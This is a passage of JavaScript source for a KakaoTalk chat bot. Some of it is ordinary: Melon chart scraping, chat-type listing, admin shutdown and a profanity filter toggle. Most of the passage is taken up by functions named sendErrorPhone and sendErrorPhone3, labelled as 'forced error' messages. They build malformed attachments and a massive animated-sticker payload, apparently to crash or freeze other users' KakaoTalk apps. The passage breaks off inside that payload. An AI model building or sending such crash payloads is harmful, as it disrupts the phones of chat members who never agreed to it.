            up_time;
            var chart = ""
        var rank = 100;  //100위까지 확인 
        request(url, function(error, response, html){
          if (!error) {
            var $ = cheerio.load(html);
           // 곡명 파싱
            for (var i = 0; i < rank; i++) {
              $('.ellipsis.rank01 > span > a').each(function(){
                var title_info = $(this);
                var title_info_text = title_info.text();
                title[i] = title_info_text;
                i++;
              })
            }
            // 아티스트명 파싱
            for (var i = 0; i < rank; i++) {
              $('.checkEllipsis').each(function(){
                var artist_info = $(this);
                var artist_info_text = artist_info.text();
                artist[i] = artist_info_text;
                i++;
              })
            }
            // 업데이트 날짜
            $('.year').each(function(){
              var date_info = $(this);
              var date_info_text = date_info.text();
              up_date = date_info_text;
            })
            // 업데이트 시간
            $('.hhmm > span').each(function(){
              var time_info = $(this);
              var time_info_text = time_info.text();
              up_time = time_info_text;
            })
            //xxxx년 xx월 xx일 오후/오전 xx시 format
            var up_date_arr = new Array();
            var up_date_arr = up_date.split('.');
            var up_time_arr = new Array();
            var up_time_arr = up_time.split(':');
            var newtime;
            // 오후 오전 삽입
            if (up_time_arr[0] >12) {
              up_time_arr[0] = up_time_arr[0] - 12
              newtime = "오후 "+up_time_arr[0];
            } else {
              newtime = "오전 " +up_time_arr[0];
            }   
            // 순위 제목 - 아티스트명
            for (var i = 1; i < rank+1; i++) {
                chart += i+ "위" + " " + title[i-1] + " - " + artist[i-1] + "\n\n"
            }
            // 업데이트 시간
            chart += "("+up_date_arr[0]+"년 "+up_date_arr[1]+"월 "+up_date_arr[2]-1+"일 "+newtime+"시에 업데이트됨)"
        sendLong(channel,"< 멜론 차트 1 ~ "+rank+"위 >",chart)  
        pausecomp(110)
        }
        });
    }}


        if (data.text == prefix + "종료") {
            if (adminList.includes(id)) {
                channel.sendChat("[ 🛡 ] 종료합니다");
                process.exit();
            }
        }

        if (data.text == prefix + "챗타입") {
            channel.sendChat("채팅 타입 목록" + "\u200b".repeat(2000) +
                "\nFEED : 0" +
                "\nTEXT : 1" +
                "\nPHOTO : 2" +
                "\nVIDEO : 3" +
                "\nCONTACT : 4" +
                "\nAUDIO : 5" +
                "\nDITEMEMOTICON : 6" +
                "\nDITEMGIFT : 7" +
                "\nDITEMIMG : 8" +
                "\nKAKAOLINKV1 : 9" +
                "\nAVATAR : 11" +
                "\nSTICKER : 12" +
                "\nSCHEDULE : 13" +
                "\nVOTE : 14" +
                "\nLOTTERY : 15" +
                "\nMAP : 16" +
                "\nPROFILE : 17" +
                "\nFILE : 18" +
                "\nSTICKERANI : 20" +
                "\nNUDGE : 21" +
                "\nACTIONCON : 22" +
                "\nSEARCH : 23" +
                "\nPOST : 24" +
                "\nSTICKERGIF : 25" +
                "\nREPLY : 26" +
                "\nMULTIPHOTO : 27" +
                "\nVOIP : 51" +
                "\nLIVETALK : 52" +
                "\nCUSTOM : 71" +
                "\nALIM : 72" +
                "\nPLUSFRIEND : 81" +
                "\nPLUSEVENT : 82" +
                "\nPLUSFRIENDVIRAL : 83" +
                "\nOPEN_SCHEDULE : 96" +
                "\nOPEN_VOTE : 97" +
                "\nOPEN_POST : 98" +
                "");
        }


        if (data.text == prefix + "아이디") {
            if (!(data.originalType == node_kakao.KnownChatType.REPLY)) {
                channel.sendChat("[ 🛡 ] " + sender.nickname + "님의 ID : " + id)
            }
        }




        function replaceAll(str, searchStr, replaceStr) {
            return str.split(searchStr).join(replaceStr);
          }
          




        if (data.text == prefix + "밴키") {
            if (adminList.includes(id)) {
            banKey.push(roomId)
            channel.sendChat("욕설 또는 광고를 감지합니다")
        }}

        if (data.text == prefix + "밴키 다운") {
            if (adminList.includes(id)) {
                for (var getValueFor = 0; getValueFor < banKey.length; getValueFor++) {
                    if (banKey[getValueFor] == roomId) {
                        banKey.splice(getValueFor);
                    }}  
            channel.sendChat("욕설 또는 광고 감지를 중지합니다")
        }}



        function sendErrorPhone() {
            channel.sendChat(
                new $ChatBuilder()
                .append(new node_kakao.AttachmentContent({
                    "os": [
                        {
                           "t": 5,
                           "ct": "강제오류 메세지",
                           "jct": "[{\"type\":\"text\",\"text\":\"" + "강제오류 메세지" + "\"}]"
                        },
                        {
                           "t": 5,
                           "st": 5,
                           "url": ""
                        }
                    ]
                }))
                .build(24)
            );
        }
        
        function sendErrorPhone3() {
            try {
                channel.sendChat(
                    new node_kakao.ChatBuilder()
                    .append(new node_kakao.AttachmentContent({
        
        os: [
        { t: 1, ct: "", jct: "" },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
